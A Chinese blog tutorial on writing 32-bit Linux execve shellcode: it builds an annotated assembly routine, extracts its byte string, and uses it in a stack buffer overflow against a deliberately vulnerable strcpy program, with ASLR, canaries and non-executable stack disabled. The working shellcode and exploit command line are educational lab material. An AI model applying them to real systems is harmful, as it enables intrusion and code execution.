---
title: Linux 基本缓冲区溢出 shellcode 编写
date: 2016-3-10 18:56:46
tags: 
- 缓冲区溢出 
- ROP
- CVE
categories: exploit 编写
---
有关shellcode定义不是很了解的请参见 [shellcode 与 exploit](http://huirong.github.io/2016/04/16/shellcodeAndExploit/)
<!-- more -->
# 1 shellcode 分析
## 1.1 execve()系统调用
最基本的shellcode就是通过调用 execve() 新开一个shell。
C语言程序：
```
#include <stdio.h>
#include <unistd.h>

int main(int argc, char** argv){
    char* name[2];
    name[0] = "/bin/sh";
    name[1] = NULL;
    execve(name[0], name, NULL);

    return 0;
}
```
编译：gcc -o shell shell.c
运行：./shell
![](https://ww4.sinaimg.cn/large/005CA6ZCjw1f9zy112hgwj30jg0443zh.jpg)
新打开了一个shell。

## 1.2 分析
execve(name[0], name, NULL);
- name[0]：/bin/sh 的地址
- name：以NULL结束的/bin/sh的地址的地址
- NULL

Linux 系统调用的参数一般存放在 ebx,ecx,edx,esi,edi 寄存器中。
因此参数分布存放情况
- ebx: "/bin/sh" 的地址,且 "/bin/sh" 后跟着 NULL
- ecx: "/bin/sh" 的地址的地址，且 /bin/sh 的地址后跟着NULL
- edx: NULL
- eax: 系统调用号
    execve()的系统调用号是 “11” 或 “0xb”

# 2 编写 exploit 
## 2.1 分析
完成 execve() 系统调用，转化为汇编需要以下几步：
1. 将以NULL结尾的字符串"/bin//sh" <font color="orange">push</font> 进栈
2. 在内存中有"/bin//sh"的地址，其后是一个 unsigned long 型的NULL值
3. 将0xb拷贝到寄存器EAX中(execve的系统调用号是0xb)
4. 将"/bin//sh"的地址 <font color="orange">mov</font> 到寄存器EBX中
5. 将"/bin//sh"地址的地址 <font color="orange">mov</font> 到寄存器ECX中
6. 将 NULL <font color="orange">mov</font> 到寄存器EDX中
7. 执行中断指令int $0x80

<font color="red">Tips：需要将 “/bin/sh” 以 4 byte 为单位分割成两部分 “/bin” 、”/sh”，但是 “/sh” 只有 3 byte，最后 1 byte 就会自动填充成 NULL，这是不允许的。因此在最前面增加一个 /，即 “//sh”，最后的字符串为 “/bin//sh”。</font>

## 2.2 汇编
对应的汇编程序 shellcode_execve.asm
```
section .text
global _start
_start:
    xor eax,eax
    push eax               ;NULL入栈
    push 0x68732f2f    ;0x68732f2f 即为//sh 的ASCII编码,注意大小端，将//sh入栈
    push 0x6e69622f    ;0x6e69622f 即为/bin 的ASCII编码，将 /bin 入栈
    mov ebx,esp          ;此时 esp 指向栈顶，即保存 以NULL结尾的"/bin//sh"，将此地址保存到 ebx 中
    push eax               ; NULL 入栈
    push ebx               ;以NULL结尾的"/bin//sh" 的地址入栈
    mov ecx,esp          ;"/bin//sh" 的地址的地址放入ecx，且 /bin//sh 的地址后跟着NULL
    xor edx,edx           ; NULL 放置到 edx
    mov al,0xb            ; execve()系统调用号 11 存放到 eax 中
    int 0x80
```

编译：nasm -f elf shellcode_execve.asm -o shellcode_execve.o
连接：ld -o shellcode_execve shellcode_execve.o 
运行：./shellcode_execve 

![](https://ww2.sinaimg.cn/large/005CA6ZCgw1f9zytwty6yj30k3020gmf.jpg)

## 2.3 提出二进制码
使用 objdump 提取二进制码：

![](https://ww4.sinaimg.cn/large/005CA6ZCgw1f9zywv42rjj30jg09kq5w.jpg)

exploit 为 
```
"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x31\xd2\xb0\x0b\xcd\x80"
```

# 3 编写shellcode
有漏洞的程序 level.c
```
#include <stdio.h>
#include <string.h>

void function(char* a){
    char buf[128];
    strcpy(buf,a);
}

int main(int argc, char** argv){
    if(argc >=2 ){
        function(argv[1]);
        printf("%s\n",argv[1]);
    }

    return 0;
}
```

通过调试找到buf起始地址和返回地址，并计算偏移 offset（此过程过程略去不表）
则 shellcode 构造如下： exploit + nop*(offset - strlen(exploit)) + exploit起始地址（即buf起始地址）
最终的shellcode如下：
```
$(python -c 'print "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x31\xd2\xb0\x0b\xcd\x80"+"A"*115+"\x80\xef\xff\xbf"')
```

- 关闭地址随机化：echo 0 > /proc/sys/kernel/randomize_va_space
- 编译（关掉canary和DEP）：gcc -o level level.c -fno-stack-protector -z execstack
- 运行: 
```
./level $(python -c 'print "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x31\xd2\xb0\x0b\xcd\x80"+"A"*115+"\x80\xef\xff\xbf"')
```

![](https://ww4.sinaimg.cn/large/005CA6ZCgw1f9zz9tuh07j30k8069q4o.jpg)

# 4 参考文献
- [linux下shellcode编写入门](http://www.cnblogs.com/Lamboy/archive/2012/07/31/2616103.html)
- [Linux下本地exploit编写shellcode之一缓冲区溢出|转](http://blog.dutsec.cn/index.php/archives/7/)
- [如何编写并编译一个shellcode(linux)](http://fcinbj.blog.51cto.com/911909/473992)